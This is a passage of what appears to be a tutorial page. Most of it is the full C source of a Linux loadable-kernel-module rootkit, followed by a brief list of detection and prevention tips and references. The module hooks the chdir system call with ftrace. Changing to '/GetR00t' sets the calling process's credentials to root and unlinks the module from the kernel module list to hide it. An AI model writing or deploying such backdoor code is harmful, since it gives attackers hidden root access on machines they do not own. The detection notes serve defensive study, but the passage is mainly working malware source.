+	retval <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>) kp.addr;
+	unregister_kprobe(<span style="color:#f92672">&amp;</span>kp);
+	<span style="color:#66d9ef">return</span> retval;
+}
+<span style="color:#75715e">#else
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">lookup_name</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>name)
+{
+	<span style="color:#66d9ef">return</span> kallsyms_lookup_name(name); <span style="color:#75715e">// finds address of syscall i.e. sys_mkdir
+</span><span style="color:#75715e"></span>}
+<span style="color:#75715e">#endif
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#if LINUX_VERSION_CODE &lt; KERNEL_VERSION(5,11,0)
+</span><span style="color:#75715e">#define FTRACE_OPS_FL_RECURSION FTRACE_OPS_FL_RECURSION_SAFE
+</span><span style="color:#75715e">#endif
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#if LINUX_VERSION_CODE &lt; KERNEL_VERSION(5,11,0)
+</span><span style="color:#75715e">#define ftrace_regs pt_regs
+</span><span style="color:#75715e"></span>
+
+
+<span style="color:#66d9ef">static</span> __always_inline <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span><span style="color:#a6e22e">ftrace_get_regs</span>(<span style="color:#66d9ef">struct</span> ftrace_regs <span style="color:#f92672">*</span>fregs)
+{
+	<span style="color:#66d9ef">return</span> fregs;
+}
+<span style="color:#75715e">#endif
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">/*
+</span><span style="color:#75715e"> * There are two ways of preventing vicious recursive loops when hooking:
+</span><span style="color:#75715e"> * - detect recusion using function return address (USE_FENTRY_OFFSET = 0)
+</span><span style="color:#75715e"> * - avoid recusion by jumping over the ftrace call (USE_FENTRY_OFFSET = 1)
+</span><span style="color:#75715e"> */</span>
+<span style="color:#75715e">#define USE_FENTRY_OFFSET 0
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">/**
+</span><span style="color:#75715e"> * struct ftrace_hook - describes a single hook to install
+</span><span style="color:#75715e"> *
+</span><span style="color:#75715e"> * @name:     name of the function to hook
+</span><span style="color:#75715e"> *
+</span><span style="color:#75715e"> * @function: pointer to the function to execute instead
+</span><span style="color:#75715e"> *
+</span><span style="color:#75715e"> * @original: pointer to the location where to save a pointer
+</span><span style="color:#75715e"> *            to the original function
+</span><span style="color:#75715e"> *
+</span><span style="color:#75715e"> * @address:  kernel address of the function entry
+</span><span style="color:#75715e"> *
+</span><span style="color:#75715e"> * @ops:      ftrace_ops state for this function hook
+</span><span style="color:#75715e"> *
+</span><span style="color:#75715e"> * The user should fill in only &amp;name, &amp;hook, &amp;orig fields.
+</span><span style="color:#75715e"> * Other fields are considered implementation details.
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">struct</span> ftrace_hook {
+	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>name;
+	<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>function;
+	<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>original;
+
+	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> address;
+	<span style="color:#66d9ef">struct</span> ftrace_ops ops;
+};
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">fh_resolve_hook_address</span>(<span style="color:#66d9ef">struct</span> ftrace_hook <span style="color:#f92672">*</span>hook)
+{
+	hook<span style="color:#f92672">-&gt;</span>address <span style="color:#f92672">=</span> lookup_name(hook<span style="color:#f92672">-&gt;</span>name);
+
+	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>hook<span style="color:#f92672">-&gt;</span>address) {
+		pr_debug(<span style="color:#e6db74">&#34;unresolved symbol: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, hook<span style="color:#f92672">-&gt;</span>name);
+		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>ENOENT;
+	}
+
+<span style="color:#75715e">#if USE_FENTRY_OFFSET
+</span><span style="color:#75715e"></span>	<span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span><span style="color:#f92672">*</span>) hook<span style="color:#f92672">-&gt;</span>original) <span style="color:#f92672">=</span> hook<span style="color:#f92672">-&gt;</span>address <span style="color:#f92672">+</span> MCOUNT_INSN_SIZE;
+<span style="color:#75715e">#else
+</span><span style="color:#75715e"></span>	<span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span><span style="color:#f92672">*</span>) hook<span style="color:#f92672">-&gt;</span>original) <span style="color:#f92672">=</span> hook<span style="color:#f92672">-&gt;</span>address;
+<span style="color:#75715e">#endif
+</span><span style="color:#75715e"></span>
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> notrace <span style="color:#a6e22e">fh_ftrace_thunk</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> ip, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> parent_ip,
+		<span style="color:#66d9ef">struct</span> ftrace_ops <span style="color:#f92672">*</span>ops, <span style="color:#66d9ef">struct</span> ftrace_regs <span style="color:#f92672">*</span>fregs)
+{
+	<span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>regs <span style="color:#f92672">=</span> ftrace_get_regs(fregs);
+	<span style="color:#66d9ef">struct</span> ftrace_hook <span style="color:#f92672">*</span>hook <span style="color:#f92672">=</span> container_of(ops, <span style="color:#66d9ef">struct</span> ftrace_hook, ops);
+
+<span style="color:#75715e">#if USE_FENTRY_OFFSET
+</span><span style="color:#75715e"></span>	regs<span style="color:#f92672">-&gt;</span>ip <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>)hook<span style="color:#f92672">-&gt;</span>function;
+<span style="color:#75715e">#else
+</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>within_module(parent_ip, THIS_MODULE))
+		regs<span style="color:#f92672">-&gt;</span>ip <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>)hook<span style="color:#f92672">-&gt;</span>function;
+<span style="color:#75715e">#endif
+</span><span style="color:#75715e"></span>}
+
+<span style="color:#75715e">/**
+</span><span style="color:#75715e"> * fh_install_hooks() - register and enable a single hook
+</span><span style="color:#75715e"> * @hook: a hook to install
+</span><span style="color:#75715e"> *
+</span><span style="color:#75715e"> * Returns: zero on success, negative error code otherwise.
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">fh_install_hook</span>(<span style="color:#66d9ef">struct</span> ftrace_hook <span style="color:#f92672">*</span>hook)
+{
+	<span style="color:#66d9ef">int</span> err;
+
+	err <span style="color:#f92672">=</span> fh_resolve_hook_address(hook);
+	<span style="color:#66d9ef">if</span> (err)
+		<span style="color:#66d9ef">return</span> err;
+
+	<span style="color:#75715e">/*
+</span><span style="color:#75715e">	 * We&#39;re going to modify %rip register so we&#39;ll need IPMODIFY flag
+</span><span style="color:#75715e">	 * and SAVE_REGS as its prerequisite. ftrace&#39;s anti-recursion guard
+</span><span style="color:#75715e">	 * is useless if we change %rip so disable it with RECURSION.
+</span><span style="color:#75715e">	 * We&#39;ll perform our own checks for trace function reentry.
+</span><span style="color:#75715e">	 */</span>
+	hook<span style="color:#f92672">-&gt;</span>ops.func <span style="color:#f92672">=</span> fh_ftrace_thunk;
+	hook<span style="color:#f92672">-&gt;</span>ops.flags <span style="color:#f92672">=</span> FTRACE_OPS_FL_SAVE_REGS
+	                <span style="color:#f92672">|</span> FTRACE_OPS_FL_RECURSION
+	                <span style="color:#f92672">|</span> FTRACE_OPS_FL_IPMODIFY;
+
+	err <span style="color:#f92672">=</span> ftrace_set_filter_ip(<span style="color:#f92672">&amp;</span>hook<span style="color:#f92672">-&gt;</span>ops, hook<span style="color:#f92672">-&gt;</span>address, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
+	<span style="color:#66d9ef">if</span> (err) {
+		pr_debug(<span style="color:#e6db74">&#34;ftrace_set_filter_ip() failed: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, err);
+		<span style="color:#66d9ef">return</span> err;
+	}
+
+	err <span style="color:#f92672">=</span> register_ftrace_function(<span style="color:#f92672">&amp;</span>hook<span style="color:#f92672">-&gt;</span>ops);
+	<span style="color:#66d9ef">if</span> (err) 
+	{
+		pr_debug(<span style="color:#e6db74">&#34;register_ftrace_function() failed: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, err);
+		ftrace_set_filter_ip(<span style="color:#f92672">&amp;</span>hook<span style="color:#f92672">-&gt;</span>ops, hook<span style="color:#f92672">-&gt;</span>address, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>);
+		<span style="color:#66d9ef">return</span> err;
+	}
+
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#75715e">/**
+</span><span style="color:#75715e"> * fh_remove_hooks() - disable and unregister a single hook
+</span><span style="color:#75715e"> * @hook: a hook to remove
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">fh_remove_hook</span>(<span style="color:#66d9ef">struct</span> ftrace_hook <span style="color:#f92672">*</span>hook)
+{
+	<span style="color:#66d9ef">int</span> err;
+
+	err <span style="color:#f92672">=</span> unregister_ftrace_function(<span style="color:#f92672">&amp;</span>hook<span style="color:#f92672">-&gt;</span>ops);
+	<span style="color:#66d9ef">if</span> (err) {
+		pr_debug(<span style="color:#e6db74">&#34;unregister_ftrace_function() failed: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, err);
+	}
+
+	err <span style="color:#f92672">=</span> ftrace_set_filter_ip(<span style="color:#f92672">&amp;</span>hook<span style="color:#f92672">-&gt;</span>ops, hook<span style="color:#f92672">-&gt;</span>address, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>);
+	<span style="color:#66d9ef">if</span> (err) {
+		pr_debug(<span style="color:#e6db74">&#34;ftrace_set_filter_ip() failed: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, err);
+	}
+}
+
+<span style="color:#75715e">/**
+</span><span style="color:#75715e"> * fh_install_hooks() - register and enable multiple hooks
+</span><span style="color:#75715e"> * @hooks: array of hooks to install
+</span><span style="color:#75715e"> * @count: number of hooks to install
+</span><span style="color:#75715e"> *
+</span><span style="color:#75715e"> * If some hooks fail to install then all hooks will be removed.
+</span><span style="color:#75715e"> *
+</span><span style="color:#75715e"> * Returns: zero on success, negative error code otherwise.
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">fh_install_hooks</span>(<span style="color:#66d9ef">struct</span> ftrace_hook <span style="color:#f92672">*</span>hooks, size_t count)
+{
+	<span style="color:#66d9ef">int</span> err;
+	size_t i;
+
+	<span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> count; i<span style="color:#f92672">++</span>) {
+		err <span style="color:#f92672">=</span> fh_install_hook(<span style="color:#f92672">&amp;</span>hooks[i]);
+		<span style="color:#66d9ef">if</span> (err)
+			<span style="color:#66d9ef">goto</span> error;
+	}
+
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+
+error:
+	<span style="color:#66d9ef">while</span> (i <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+		fh_remove_hook(<span style="color:#f92672">&amp;</span>hooks[<span style="color:#f92672">--</span>i]);
+	}
+
+	<span style="color:#66d9ef">return</span> err;
+}
+
+<span style="color:#75715e">/**
+</span><span style="color:#75715e"> * fh_remove_hooks() - disable and unregister multiple hooks
+</span><span style="color:#75715e"> * @hooks: array of hooks to remove
+</span><span style="color:#75715e"> * @count: number of hooks to remove
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">fh_remove_hooks</span>(<span style="color:#66d9ef">struct</span> ftrace_hook <span style="color:#f92672">*</span>hooks, size_t count)
+{
+	size_t i;
+
+	<span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> count; i<span style="color:#f92672">++</span>)
+		fh_remove_hook(<span style="color:#f92672">&amp;</span>hooks[i]);
+}
+
+<span style="color:#75715e">#ifndef CONFIG_X86_64
+</span><span style="color:#75715e">#error Currently only x86_64 architecture is supported
+</span><span style="color:#75715e">#endif
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">// Checking kenerl version (changes were made after 4.17.0 so need to be handled differently)
+</span><span style="color:#75715e"></span><span style="color:#75715e">#if defined(CONFIG_X86_64) &amp;&amp; (LINUX_VERSION_CODE &gt;= KERNEL_VERSION(4,17,0))
+</span><span style="color:#75715e">#define PTREGS_SYSCALL_STUBS 1
+</span><span style="color:#75715e">#endif
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">/*
+</span><span style="color:#75715e"> * Tail call optimization can interfere with recursion detection based on
+</span><span style="color:#75715e"> * return address on the stack. Disable it to avoid machine hangups.
+</span><span style="color:#75715e"> */</span>
+<span style="color:#75715e">#if !USE_FENTRY_OFFSET
+</span><span style="color:#75715e">#pragma GCC optimize(&#34;-fno-optimize-sibling-calls&#34;)
+</span><span style="color:#75715e">#endif
+</span><span style="color:#75715e"></span>
+
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">short</span> hide <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+
+<span style="color:#75715e">// Start of hooks ---------------------------------------------------------
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#ifdef PTREGS_SYSCALL_STUBS
+</span><span style="color:#75715e"></span><span style="color:#75715e">//NEW WAY 
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">static</span> asmlinkage <span style="color:#a6e22e">long</span> (<span style="color:#f92672">*</span>orig_chdir)(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>);
+
+asmlinkage <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">fh_sys_chdir</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>regs)
+{
+    <span style="color:#66d9ef">void</span> set_root(<span style="color:#66d9ef">void</span>);
+	<span style="color:#66d9ef">void</span> showrootkit(<span style="color:#66d9ef">void</span>);
+
+	printk(KERN_INFO <span style="color:#e6db74">&#34;Intercepting chdir call&#34;</span>);
+	
+    
+    <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>filename <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)regs<span style="color:#f92672">-&gt;</span>di;
+    <span style="color:#66d9ef">char</span> dir[<span style="color:#ae81ff">255</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+
+    <span style="color:#66d9ef">long</span> err <span style="color:#f92672">=</span> strncpy_from_user(dir, filename, <span style="color:#ae81ff">254</span>);
+
+	
+    <span style="color:#66d9ef">if</span> (err <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>)
+		{
+        printk(KERN_INFO <span style="color:#e6db74">&#34;rootkit: trying to create directory with name: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, dir);
+		}
+		
+
+
+    <span style="color:#66d9ef">if</span> ( (strcmp(dir, <span style="color:#e6db74">&#34;/GetR00t&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span> (hide <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) )
+        {
+            printk(KERN_INFO <span style="color:#e6db74">&#34;rootkit: giving root...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+            set_root();
+            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+        }
+	
+	<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( (strcmp(dir, <span style="color:#e6db74">&#34;/GetR00t&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span> (hide <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) )
+        {
+			printk(KERN_INFO <span style="color:#e6db74">&#34;showing rootkit </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+			showrootkit();
+			hide <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+        }
+
+	printk(KERN_INFO <span style="color:#e6db74">&#34;ORIGINAL CALL&#34;</span>);
+	<span style="color:#66d9ef">return</span> orig_chdir(regs);
+	
+	
+}
+<span style="color:#75715e">#else
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">static</span> asmlinkage <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">sys_chdir</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>filename);
+
+asmlinkage <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">fh_sys_chdir</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>filename)
+{
+    <span style="color:#66d9ef">void</span> set_root(<span style="color:#66d9ef">void</span>);
+	<span style="color:#66d9ef">void</span> showrootkit(<span style="color:#66d9ef">void</span>);
+
+	printk(KERN_INFO <span style="color:#e6db74">&#34;Intercepting chdir call (old way)&#34;</span>);
+
+    <span style="color:#66d9ef">char</span> dir[<span style="color:#ae81ff">255</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+
+    <span style="color:#66d9ef">long</span> err <span style="color:#f92672">=</span> strncpy_from_user(dir, filename, <span style="color:#ae81ff">254</span>);
+
+    <span style="color:#66d9ef">if</span> (error <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>)
+		{
+        printk(KERN_INFO <span style="color:#e6db74">&#34;rootkit: trying to create directory with name %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, dir);
+		}
+
+	<span style="color:#66d9ef">if</span> ( (strcmp(dir, <span style="color:#e6db74">&#34;/GetR00t&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span> (hide <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) )
+        {
+            printk(KERN_INFO <span style="color:#e6db74">&#34;rootkit: giving root...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+            set_root();
+            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+        }
+
+	<span style="color:#66d9ef">else</span> ( (strcmp(dir, <span style="color:#e6db74">&#34;/GetR00t&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span> (hide <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) )
+        {
+			printk(KERN_INFO <span style="color:#e6db74">&#34;showing rootkit </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+			showrootkit();
+			hide <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+        }
+	
+    
+	<span style="color:#66d9ef">return</span> orig_chdir(filename);
+		
+}
+<span style="color:#75715e">#endif
+</span><span style="color:#75715e"></span>
+
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">set_root</span>(<span style="color:#66d9ef">void</span>)
+      {
+		   <span style="color:#66d9ef">void</span> hiderootkit(<span style="color:#66d9ef">void</span>);
+		   
+		   printk(KERN_INFO <span style="color:#e6db74">&#34;set_root called&#34;</span>);
+		   
+		   printk(KERN_INFO <span style="color:#e6db74">&#34;The process is </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> (pid %i)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, current<span style="color:#f92672">-&gt;</span>comm, current<span style="color:#f92672">-&gt;</span>pid);
+
+		   <span style="color:#66d9ef">struct</span> cred <span style="color:#f92672">*</span>root;
+           root <span style="color:#f92672">=</span> prepare_creds();
+           
+           <span style="color:#66d9ef">if</span> (root <span style="color:#f92672">==</span> NULL)
+           {
+               printk(KERN_INFO <span style="color:#e6db74">&#34;root is NULL&#34;</span>);
+			   <span style="color:#66d9ef">return</span>;
+           }
+
+			printk(KERN_INFO <span style="color:#e6db74">&#34;Setting privileges... &#34;</span>);
+           <span style="color:#75715e">/* Run through and set all the various *id&#39;s of the current user and set them all to 0 (root) */</span>
+            root<span style="color:#f92672">-&gt;</span>uid.val <span style="color:#f92672">=</span> root<span style="color:#f92672">-&gt;</span>gid.val <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+            root<span style="color:#f92672">-&gt;</span>euid.val <span style="color:#f92672">=</span> root<span style="color:#f92672">-&gt;</span>egid.val <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+            root<span style="color:#f92672">-&gt;</span>suid.val <span style="color:#f92672">=</span> root<span style="color:#f92672">-&gt;</span>sgid.val <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+            root<span style="color:#f92672">-&gt;</span>fsuid.val <span style="color:#f92672">=</span> root<span style="color:#f92672">-&gt;</span>fsgid.val <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+
+
+           <span style="color:#75715e">/* Set the credentials to root */</span>
+		   printk(KERN_INFO <span style="color:#e6db74">&#34;Commiting creds&#34;</span>);
+           commit_creds(root);
+		   
+		   
+		   <span style="color:#75715e">/* Hide rootkit once root has been given */</span>
+		   printk(KERN_INFO <span style="color:#e6db74">&#34;Hiding rootkit </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+		   hiderootkit();
+		   hide <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+      }
+
+
+
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">struct</span> list_head <span style="color:#f92672">*</span>prev_module;
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">hiderootkit</span>(<span style="color:#66d9ef">void</span>)
+	{
+	prev_module <span style="color:#f92672">=</span> THIS_MODULE<span style="color:#f92672">-&gt;</span>list.prev;
+    list_del(<span style="color:#f92672">&amp;</span>THIS_MODULE<span style="color:#f92672">-&gt;</span>list);
+
+	}
+
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">showrootkit</span>(<span style="color:#66d9ef">void</span>)
+	{
+	list_add(<span style="color:#f92672">&amp;</span>THIS_MODULE<span style="color:#f92672">-&gt;</span>list, prev_module);
+	}
+
+
+
+<span style="color:#75715e">/*
+</span><span style="color:#75715e"> * x86_64 kernels have a special naming convention for syscall entry points in newer kernels.
+</span><span style="color:#75715e"> * That&#39;s what you end up with if an architecture has 3 (three) ABIs for system calls.
+</span><span style="color:#75715e"> */</span>
+<span style="color:#75715e">#ifdef PTREGS_SYSCALL_STUBS
+</span><span style="color:#75715e">#define SYSCALL_NAME(name) (&#34;__x64_&#34; name)
+</span><span style="color:#75715e">#else
+</span><span style="color:#75715e">#define SYSCALL_NAME(name) (name)
+</span><span style="color:#75715e">#endif
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#define HOOK(_name, _function, _original)	\
+</span><span style="color:#75715e">	{					\
+</span><span style="color:#75715e">		.name = SYSCALL_NAME(_name),	\
+</span><span style="color:#75715e">		.function = (_function),	\
+</span><span style="color:#75715e">		.original = (_original),	\
+</span><span style="color:#75715e">	}
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">struct</span> ftrace_hook demo_hooks[] <span style="color:#f92672">=</span> {
+	HOOK(<span style="color:#e6db74">&#34;sys_chdir&#34;</span>,  fh_sys_chdir,  <span style="color:#f92672">&amp;</span>orig_chdir)
+};
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">rootkit_init</span>(<span style="color:#66d9ef">void</span>)
+{
+	<span style="color:#66d9ef">int</span> err;
+
+	err <span style="color:#f92672">=</span> fh_install_hooks(demo_hooks, ARRAY_SIZE(demo_hooks));
+	<span style="color:#66d9ef">if</span> (err)
+		<span style="color:#66d9ef">return</span> err;
+
+	printk(KERN_INFO <span style="color:#e6db74">&#34;module loaded</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">rootkit_exit</span>(<span style="color:#66d9ef">void</span>)
+{
+	fh_remove_hooks(demo_hooks, ARRAY_SIZE(demo_hooks));
+
+	printk(KERN_INFO <span style="color:#e6db74">&#34;module unloaded</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+}
+
+module_init(rootkit_init);
+module_exit(rootkit_exit);
+</code></pre></div><h1 id="detection">Detection<a href="#detection" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<ul>
+<li>Taking hashes of certain parts of the kernel memory space to detect any changes</li>
+<li>If hooking <code>kill</code>, look for unused signals being called with kill</li>
+<li>The <code>kill</code> syscall has been used before in well known rootkits. Kill is just a way of sending signals to programs, it’s not just a way to stop programs from running. There are 31 signals you can send. However, when used in rootkits, unused signals such as 64 are used to trigger code in their rootkit. Looking for anyone running kill commands with unused signals can be a sign of malicious activity.</li>
+</ul>
+<h1 id="prevention">Prevention<a href="#prevention" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<ul>
+<li>Disable loading LKMs at runtime</li>
+</ul>
+<h1 id="references">References<a href="#references" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<ul>
+<li><a href="https://github.com/ilammy/ftrace-hook/blob/master/ftrace_hook.c">ftrace code</a></li>
+<li><a href="http://derekmolloy.ie/writing-a-linux-kernel-module-part-1-introduction/">Writing a Linux Kernel Module — Part 1: Introduction | derekmolloy.ie</a></li>
+<li><a href="https://static.lwn.net/images/pdf/LDD3/ch02.pdf">,ch02.6536 (lwn.net)</a></li>
+<li><a href="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485">Kernel RootKits. Getting your hands dirty - Malware - 0x00sec - The Home of the Hacker</a></li>
+<li><a href="https://xcellerator.github.io/posts/linux_rootkits_02/">Linux Rootkits Part 2: Ftrace and Function Hooking :: TheXcellerator</a></li>
+<li><a href="https://www.codeproject.com/Articles/1275114/Hooking-Linux-Kernel-Functions-Part-2-How-to-Hook">Hooking Linux Kernel Functions, Part 2: How to Hook Functions with Ftrace - CodeProject</a></li>
+</ul>
 
       </div></div>
 
